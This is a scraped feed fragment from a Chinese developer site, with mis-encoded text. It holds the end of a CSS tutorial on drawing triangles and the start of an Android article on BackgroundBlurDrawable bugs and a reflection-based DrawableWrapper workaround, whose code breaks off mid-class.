  <span class="hljs-comment">/* clip-path: polygon(0% 0%, 100% 0%, 50% 100%); */</span>
  
  <span class="hljs-comment">/* å‘å·¦ä¸‰è§’å½¢ */</span>
  <span class="hljs-comment">/* clip-path: polygon(100% 0%, 100% 100%, 0% 50%); */</span>
  
  <span class="hljs-comment">/* å‘å³ä¸‰è§’å½¢ */</span>
  <span class="hljs-comment">/* clip-path: polygon(0% 0%, 0% 100%, 100% 50%); */</span>
}
</code></pre>
<h2 data-id="heading-7">æ–¹æ³•å››ï¼šä½¿ç”¨çº¿æ€§æ¸å˜ï¼ˆbackground linear-gradientï¼‰</h2>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.triangle-gradient</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  
  <span class="hljs-comment">/* å‘ä¸Šä¸‰è§’å½¢ */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom right, transparent <span class="hljs-number">49.5%</span>, <span class="hljs-number">#3498db</span> <span class="hljs-number">50%</span>) 
      left / <span class="hljs-number">50%</span> <span class="hljs-number">100%</span> no-repeat,
    <span class="hljs-built_in">linear-gradient</span>(to bottom left, transparent <span class="hljs-number">49.5%</span>, <span class="hljs-number">#3498db</span> <span class="hljs-number">50%</span>) 
      right / <span class="hljs-number">50%</span> <span class="hljs-number">100%</span> no-repeat;
}
</code></pre>
<h2 data-id="heading-8">æ–¹æ³•äº”ï¼šä½¿ç”¨ ::before æˆ– ::after ä¼ªå…ƒç´ </h2>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.triangle-arrow</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
}

<span class="hljs-selector-class">.triangle-arrow</span><span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">right</span>: -<span class="hljs-number">20px</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">25px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">25px</span> solid transparent;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">20px</span> solid <span class="hljs-number">#3498db</span>;
}
</code></pre>
<h2 data-id="heading-9">å®é™…åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-10">ç¤ºä¾‹ 1ï¼šå¯¹è¯æ¡†æ°”æ³¡</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble"</span>&gt;</span>
  Hello, I'm a tooltip!
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble-arrow"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.bubble</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">display</span>: inline-block;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#2ecc71</span>;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}

<span class="hljs-selector-class">.bubble-arrow</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">10px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">10px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">10px</span> solid <span class="hljs-number">#2ecc71</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-11">ç¤ºä¾‹ 2ï¼šä¸‹æ‹‰èœå•ç®­å¤´</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown"</span>&gt;</span>
  Menu
  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"arrow"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.dropdown</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">30px</span> <span class="hljs-number">8px</span> <span class="hljs-number">15px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}

<span class="hljs-selector-class">.arrow</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">right</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">50%</span>);
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">5px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">5px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">5px</span> solid white;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-12">å¯¹æ¯”ä¸å»ºè®®</h2>



































<table><thead><tr><th>æ–¹æ³•</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>Border æ–¹æ³•</strong></td><td>å…¼å®¹æ€§å¥½ï¼ˆIE6+ï¼‰ï¼Œç®€å•</td><td>é¢œè‰²åªèƒ½çº¯è‰²ï¼Œè°ƒæ•´å¤§å°éº»çƒ¦</td><td>ç®€å•ä¸‰è§’å½¢ï¼Œå…¼å®¹æ€§è¦æ±‚é«˜</td></tr><tr><td><strong>Clip-path</strong></td><td>çµæ´»ï¼Œå¯ä»¥åˆ›å»ºä»»æ„å½¢çŠ¶</td><td>IE ä¸æ”¯æŒï¼Œéƒ¨åˆ†æµè§ˆå™¨éœ€å‰ç¼€</td><td>ç°ä»£æµè§ˆå™¨ï¼Œå¤æ‚å½¢çŠ¶</td></tr><tr><td><strong>Transform</strong></td><td>å¯ä»¥æ—‹è½¬ä»»æ„è§’åº¦</td><td>éœ€è¦é¢å¤–å®¹å™¨ï¼Œè®¡ç®—å¤æ‚</td><td>éœ€è¦æ—‹è½¬çš„ç‰¹æ®Šåœºæ™¯</td></tr><tr><td><strong>æ¸å˜</strong></td><td>å¯ä»¥æ¸å˜é¢œè‰²</td><td>ä»£ç å¤æ‚ï¼Œæ§åˆ¶ç²¾åº¦ä½</td><td>éœ€è¦æ¸å˜æ•ˆæœçš„ä¸‰è§’å½¢</td></tr></tbody></table>
<h2 data-id="heading-13">å®ç”¨æŠ€å·§</h2>
<ol>
<li><strong>ç­‰è¾¹ä¸‰è§’å½¢</strong>ï¼šä½¿ç”¨ border æ–¹æ³•æ—¶ï¼Œç¡®ä¿ä¸¤ä¾§è¾¹æ¡†å®½åº¦ç›¸ç­‰</li>
<li><strong>ç­‰è…°ç›´è§’ä¸‰è§’å½¢</strong>ï¼šè®¾ç½®ä¸¤æ¡è¾¹æ¡†ç›¸ç­‰ï¼Œç¬¬ä¸‰æ¡ä¸ºé€æ˜</li>
<li><strong>ç©ºå¿ƒä¸‰è§’å½¢</strong>ï¼šä½¿ç”¨ä¸¤ä¸ªä¸‰è§’å½¢å åŠ å®ç°</li>
</ol>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ç©ºå¿ƒä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.hollow-triangle</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#3498db</span>;
}

<span class="hljs-selector-class">.hollow-triangle</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: -<span class="hljs-number">95px</span>; <span class="hljs-comment">/* ç•¥å°äºå¤–éƒ¨ä¸‰è§’å½¢ */</span>
  <span class="hljs-attribute">left</span>: -<span class="hljs-number">45px</span>; <span class="hljs-comment">/* ç•¥å°äºå¤–éƒ¨ä¸‰è§’å½¢ */</span>
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">45px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">45px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">95px</span> solid white; <span class="hljs-comment">/* èƒŒæ™¯è‰² */</span>
}
</code></pre>
<h2 data-id="heading-14">æ€»ç»“</h2>
<ul>
<li><strong>æœ€å¸¸ç”¨</strong>ï¼šBorder è¾¹æ¡†æ–¹æ³•ï¼Œå…¼å®¹æ€§å¥½</li>
<li><strong>æœ€çµæ´»</strong>ï¼šClip-path æ–¹æ³•ï¼Œå¯ä»¥åˆ›å»ºä»»æ„å½¢çŠ¶</li>
<li><strong>æœ€ç›´è§‚</strong>ï¼šä½¿ç”¨åœ¨çº¿å·¥å…·ç”Ÿæˆ clip-path ä»£ç </li>
<li><strong>æ¨è</strong>ï¼šå¯¹äºç®€å•çš„ä¸‰è§’å½¢ç”¨ borderï¼Œå¯¹äºå¤æ‚æˆ–éœ€è¦å“åº”çš„ç”¨ clip-path</li>
</ul>
<p>è®°ä½æ ¸å¿ƒåŸç†ï¼š<strong>CSS è¾¹æ¡†åœ¨å…ƒç´ å®½é«˜ä¸º 0 æ—¶ï¼Œä¼šåœ¨äº¤ç•Œå¤„å½¢æˆå¯¹è§’çº¿ï¼Œä»è€Œåˆ›å»ºä¸‰è§’å½¢ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android é«˜æ–¯æ¨¡ç³Šï¼ˆ2ï¼‰BackgroundBlurDrawableä½¿ç”¨åŠç›¸å…³Bug]]></title>    <link>https://juejin.cn/post/7589107312113516553</link>    <guid>https://juejin.cn/post/7589107312113516553</guid>    <pubDate>2025-12-29T15:32:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589107312113516553" data-draft-id="7589104492883099700" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android é«˜æ–¯æ¨¡ç³Šï¼ˆ2ï¼‰BackgroundBlurDrawableä½¿ç”¨åŠç›¸å…³Bug"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T15:32:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— è¨€Echo"/> <meta itemprop="url" content="https://juejin.cn/user/942714871630682"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android é«˜æ–¯æ¨¡ç³Šï¼ˆ2ï¼‰BackgroundBlurDrawableä½¿ç”¨åŠç›¸å…³Bug
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/942714871630682/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— è¨€Echo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:32:06.000Z" title="Mon Dec 29 2025 15:32:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰æ–‡ä»‹ç»äº†çª—å£é«˜æ–¯æ¨¡ç³Šçš„ä¸¤ç§å®ç°å’ŒåŸºæœ¬åŸç†</p>
<p><a href="https://juejin.cn/post/7589052659436634158" target="_blank" title="https://juejin.cn/post/7589052659436634158">Android é«˜æ–¯æ¨¡ç³Šï¼ˆ1ï¼‰ çª—å£æ¨¡ç³ŠåŠjavaä¾§åŸºæœ¬æµç¨‹ç®€è¿°</a></p>
<p>æœ¬æ–‡å°†ä»‹ç»ä¸€ä¸‹BackgroundBlurDrawableçš„ä½¿ç”¨ï¼ŒåŸç”Ÿbugï¼Œä»¥åŠè§£å†³æ–¹æ¡ˆ</p>
<h2 data-id="heading-0">1.ä»»æ„Viewä½¿ç”¨BackgroundBlurDrawable</h2>
<p>BackgroundBlurDrawableåœ¨åŸç”Ÿä¸­æ˜¯ç»™DecorViewä½œä¸ºèƒŒæ™¯ä½¿ç”¨çš„ï¼Œå‡å¦‚æˆ‘ä»¬å…¶ä»–çš„Viewä¹Ÿæƒ³ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒåŸç”Ÿä»£ç ï¼Œè‡ªè¡Œåˆ›å»ºä¸€ä¸ªBackgroundBlurDrawableï¼Œè®¾ç½®ç»™Viewä½œä¸ºèƒŒæ™¯å³å¯ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ³¨æ„éœ€è¦Viewåœ¨attachWindowä¹‹åæ‰èƒ½è·å–åˆ°ViewRootImpl</span>
hostView.background = hostView.getViewRootImpl().createBackgroundBlurDrawable().apply {
setColor(Color.TRANSPARENT)
    setBlurRadius(<span class="hljs-number">70</span>)
    setCornerRadius(<span class="hljs-number">32f</span>)
} 
</code></pre>
<h2 data-id="heading-1">2.å­˜åœ¨çš„bug</h2>
<h3 data-id="heading-2">2.1.Â è½¯ä»¶ç»˜åˆ¶æ—¶ä¼šå‘ç”ŸCrash</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8b5d70bc74d4fd5afcf06e5598e670f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=3%2BH%2Fpta9tMENg1JMa35ES%2BXah%2Bw%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯å› ä¸ºè½¯ä»¶ç»˜åˆ¶æ—¶ä¸æ”¯æŒdrawRenderNode</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6d535e25507427598f605e698b21f4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=Bj9ZBygboGLpkKZLS7wQG7ObLBY%3D" alt="" loading="lazy"/></p>
<p>ä¿®å¤æ–¹æ¡ˆï¼šè½¯ä»¶ç»˜åˆ¶æ—¶ä¸æ‰§è¡ŒdrawRenderNodeï¼ˆéœ€ä¿®æ”¹æºç ï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/005a8f396bd84954986d23d1f8569deb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=J%2FZixQNU0BItjOQl3oCPmYVsr04%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 Â Â é«˜æ–¯æ¨¡ç³Šæ•ˆæœå¯ä»¥æ¸²æŸ“åˆ°çª—å£èŒƒå›´ä¹‹å¤–</h3>
<p>å‘çª—å£èŒƒå›´åªæœ‰ä¸€éƒ¨åˆ†ï¼Œæœªé“ºæ»¡å…¨å±ï¼Œæ¯”å¦‚ä¸€ä¸ªå°å¼¹æ¡†ï¼Œå…¶å†…éƒ¨viewé€šè¿‡scrollæˆ–transitionåç§»æ—¶ï¼Œå…¶é«˜æ–¯æ¨¡ç³Šæ•ˆæœä¼šè·Ÿéšä¾¿å®œç”šè‡³ä¼šè¶…å‡ºå½“å‰çª—å£èŒƒå›´ã€‚</p>
<p>Â Â è§£å†³æ–¹æ¡ˆï¼šé™å®šåæ ‡èŒƒå›´ï¼Œä½¿å…¶èŒƒå›´ä¸èƒ½è¶…è¿‡æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚</p>
<p>ï¼ˆè¿™é‡Œçš„æ•°å­—åªæ˜¯ä¸¾ä¾‹ï¼Œæ­£å¸¸é€šè¿‡æ·»åŠ æ–¹æ³•æ”¯æŒå¤–éƒ¨å‚æ•°è®¾ç½®ï¼‰ï¼ˆä¿®æ”¹æºç ï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fb002e26348473f946702cd256553a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=60QwMg%2FagWmq8rK9XCkjK1K3vZs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2.3. Appç«¯ä¿®æ”¹æ–¹æ¡ˆ</h3>
<p>ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜ä¿®æ”¹æ–¹æ¡ˆéƒ½æ˜¯åœ¨frameworkä¸­ä¿®æ”¹ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨appå¼€å‘è¿‡ç¨‹ä¸­ï¼Œæ— æ³•ç›´æ¥ä¿®æ”¹frameworkï¼›æ­¤å¤–BackgroundBlurDrawableæ˜¯finalç±»å‹ï¼Œåœ¨appç«¯ä¹Ÿæ— æ³•ç›´æ¥ç»§æ‰¿ä¿®æ”¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b6ef8441fa54802899a5e6ae5e0053c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=8rv9unBVQWHYSu%2B6udxixB2toNI%3D" alt="" loading="lazy"/></p>
<p>å¥½åœ¨å­˜åœ¨DrawableWrapperï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªDrawableWrapperåŒ…è£…åŸç”Ÿçš„BackgroundBlurDrawableï¼Œ</p>
<ol>
<li>è§£å†³Crashé—®é¢˜</li>
</ol>
<p>Â Â ä»…åœ¨ç¡¬ä»¶åŠ é€Ÿæ—¶ï¼ŒBackgroundBlurDrawableæ‰ç»˜åˆ¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/527924fec07f4730a565c2ab11d0dc2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=S5YKpW3h%2Bfe4y4AlSF%2FSseuP3TM%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>è§£å†³é«˜æ–¯æ¨¡ç³Šæ•ˆæœæ¸²æŸ“åˆ°çª—å£èŒƒå›´ä¹‹å¤–çš„é—®é¢˜</li>
</ol>
<p>Â Â åå°„è·å–åˆ°rendernodeï¼Œä½¿ç”¨è‡ªå·±çš„ç›‘å¬å™¨ï¼Œæ›¿æ¢æ‰æ—§çš„ç›‘å¬å™¨</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fbd03d943e845acaa569c4c84e60757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767627126&amp;x-signature=Kl%2BFIw4%2ByFe92XYHPVqPsFJ0I6I%3D" alt="image.png" loading="lazy"/></p>
<p>ç¤ºä¾‹æ–¹æ¡ˆä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.lws.app.graphics.drawable

<span class="hljs-keyword">import</span> android.<span class="hljs-keyword">annotation</span>.SuppressLint
<span class="hljs-keyword">import</span> android.graphics.Canvas
<span class="hljs-keyword">import</span> android.graphics.Paint
<span class="hljs-keyword">import</span> android.graphics.Path
<span class="hljs-keyword">import</span> android.graphics.Rect
<span class="hljs-keyword">import</span> android.graphics.RenderNode
<span class="hljs-keyword">import</span> android.graphics.drawable.DrawableWrapper
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> android.view.View
<span class="hljs-keyword">import</span> androidx.<span class="hljs-keyword">annotation</span>.ColorInt
<span class="hljs-keyword">import</span> com.android.<span class="hljs-keyword">internal</span>.graphics.drawable.BackgroundBlurDrawable

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BackgroundBlurDrawableV2</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constructor</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> backgroundBlurDrawable: BackgroundBlurDrawable) :
    DrawableWrapper(backgroundBlurDrawable) {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mPaint: Paint = fieldPaint.<span class="hljs-keyword">get</span>(backgroundBlurDrawable) <span class="hljs-keyword">as</span> Paint
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mRectPath: Path = fieldRectPath.<span class="hljs-keyword">get</span>(backgroundBlurDrawable) <span class="hljs-keyword">as</span> Path

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mAggregator = fieldAggregator.<span class="hljs-keyword">get</span>(backgroundBlurDrawable)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> mRect: Rect = fieldRect.<span class="hljs-keyword">get</span>(backgroundBlurDrawable) <span class="hljs-keyword">as</span> Rect

    <span class="hljs-keyword">var</span> minTop = <span class="hljs-number">130</span>
    <span class="hljs-keyword">var</span> maxBottom = <span class="hljs-number">1800</span>

